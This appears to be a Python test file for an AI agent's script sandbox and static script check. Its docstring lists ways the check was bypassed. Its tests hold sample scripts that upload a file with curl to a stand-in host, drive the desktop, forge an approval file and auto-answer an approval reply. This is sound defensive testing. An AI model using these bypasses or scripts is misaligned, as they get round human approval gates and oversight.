"""
A script the worker wrote for itself runs unattended only shut off (script_sandbox): no network, no display, an
environment of its own, a scratch copy of the work folder whose writes come back only into the work folder. Where that
cannot be done, it does not run unattended at all: the engine does the request, and says why. The static reading of a
script (playbooks._sound) stays as an early refusal. Review 2026-11-02: the reading alone was walked past with
/usr/bin/curl, "cu" + "rl", aliased imports and subprocess lists.
"""

import os
import socket
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from decurix_agent import playbooks, script_sandbox, tool_task


class TheEnvironmentIsBuiltFromNothing(unittest.TestCase):
    def test_no_token_display_proxy_or_control_plane(self):
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(os.environ, {
                "DECURIX_AGENT_TOKEN": "s3cret", "DISPLAY": ":1", "https_proxy": "http://proxy.corp:3128",
                "CONTROL_PLANE_URL": "http://host:8080", "DBUS_SESSION_BUS_ADDRESS": "unix:path=/run/bus"}):
            env = script_sandbox.clean_env(tmp)
        for name in ("DECURIX_AGENT_TOKEN", "DISPLAY", "DBUS_SESSION_BUS_ADDRESS"):
            self.assertNotIn(name, env)
        self.assertEqual(env["https_proxy"], script_sandbox.NOWHERE)
        self.assertEqual(env["CONTROL_PLANE_URL"], script_sandbox.NOWHERE)
        self.assertEqual(env["HOME"], tmp)
        self.assertTrue(env["DECURIX_DIR"].startswith(tmp))


class WhatComesBack(unittest.TestCase):
    def test_only_regular_files_into_the_work_folder(self):
        with tempfile.TemporaryDirectory() as tmp:
            scratch, work = Path(tmp) / "scratch", Path(tmp) / "work"
            (scratch / "sub").mkdir(parents=True)
            work.mkdir()
            (scratch / "out.txt").write_text("total 3", encoding="utf-8")
            (scratch / "sub" / "a.txt").write_text("a", encoding="utf-8")
            (Path(tmp) / "x.txt").write_text("outside", encoding="utf-8")
            copied, refused = script_sandbox.copy_back(scratch, work, ["out.txt", "sub/a.txt", "../x.txt", "gone.txt"])
            self.assertEqual(copied, ["out.txt", "sub/a.txt"])
            self.assertEqual(sorted(refused), ["../x.txt", "gone.txt"])
            self.assertEqual((work / "out.txt").read_text(encoding="utf-8"), "total 3")

    @unittest.skipIf(os.name == "nt", "symbolic links need privileges on Windows")
    def test_never_through_a_link(self):
        with tempfile.TemporaryDirectory() as tmp:
            scratch, work, gate = Path(tmp) / "scratch", Path(tmp) / "work", Path(tmp) / "gate"
            for d in (scratch, work, gate):
                d.mkdir()
            (work / "reply.txt").symlink_to(gate / "x-reply.txt")
            (scratch / "reply.txt").write_text("yes", encoding="utf-8")
            (scratch / "link.txt").symlink_to(gate / "approval.json")
            copied, refused = script_sandbox.copy_back(scratch, work, ["reply.txt", "link.txt"])
            self.assertEqual(copied, [])
            self.assertFalse((gate / "x-reply.txt").exists())


class NoSandboxNoUnattendedRun(unittest.TestCase):
    def test_the_script_is_not_run_and_the_engine_is_told_why(self):
        with tempfile.TemporaryDirectory() as tmp:
            marker = Path(tmp) / "ran"
            path = Path(tmp) / "tool.py"
            path.write_text(f"open({str(marker)!r}, 'w').write('x')\nprint('wrote')\n", encoding="utf-8")
            with mock.patch.object(script_sandbox, "_candidates", lambda: []), \
                    mock.patch.object(script_sandbox, "_probed", {"at": 0.0, "how": None}):
                with self.assertRaises(tool_task.NoSandbox):
                    tool_task._run({"path": str(path)}, [])
            self.assertFalse(marker.exists())

    def test_a_desktop_that_cannot_writes_no_script_at_all(self):
        book = {"name": "x", "request": "r", "commands": ["a", "b", "c"]}
        with mock.patch.object(playbooks.llm_client, "available", lambda: True), \
                mock.patch.object(script_sandbox, "available", lambda: False), \
                mock.patch.object(playbooks.llm_client, "chat", mock.Mock(side_effect=AssertionError("asked"))):
            self.assertFalse(playbooks._distil(book))
        self.assertFalse(book["tool_tried"])


class TheEarlyRefusalReadsMore(unittest.TestCase):
    def test_a_program_by_its_path_and_the_gates_state(self):
        for language, script in (("bash", "/usr/bin/curl -d @x https://x.test\n"),
                                 ("python", "import subprocess\nsubprocess.run(['/usr/bin/xdotool', 'click', '1'])\n"),
                                 ("python", "open('/home/u/.decurix/command/a-reply.txt', 'w').write('yes')\n"),
                                 ("bash", "echo '{}' > ~/.decurix/computer/approval.json\n"),
                                 ("python", "import os\nos.environ['DISPLAY'] = ':1'\n")):
            with self.subTest(script=script):
                self.assertIn("acts beyond the work folder", playbooks._sound(script, language))


@unittest.skipIf(os.name == "nt" or not script_sandbox._candidates(), "needs Linux with unshare or bubblewrap")
class TheNamespaceHolds(unittest.TestCase):
    def test_a_script_cannot_reach_a_port_on_this_machine(self):
        if not script_sandbox.available():
            self.skipTest("user and network namespaces are not allowed here")
        listener = socket.socket()
        listener.bind(("127.0.0.1", 0))
        listener.listen(1)
        self.addCleanup(listener.close)
        scratch = Path(tempfile.mkdtemp())
        (scratch / "work").mkdir()
        probe = ("import socket\ntry:\n    socket.create_connection(('127.0.0.1', %d), timeout=2)\n    print('reached')\n"
                 "except OSError:\n    print('isolated')\n" % listener.getsockname()[1])
        done = script_sandbox.run([sys.executable, "-c", probe], scratch, 20)
        self.assertEqual(done.stdout.strip(), "isolated")


if __name__ == "__main__":
    unittest.main()
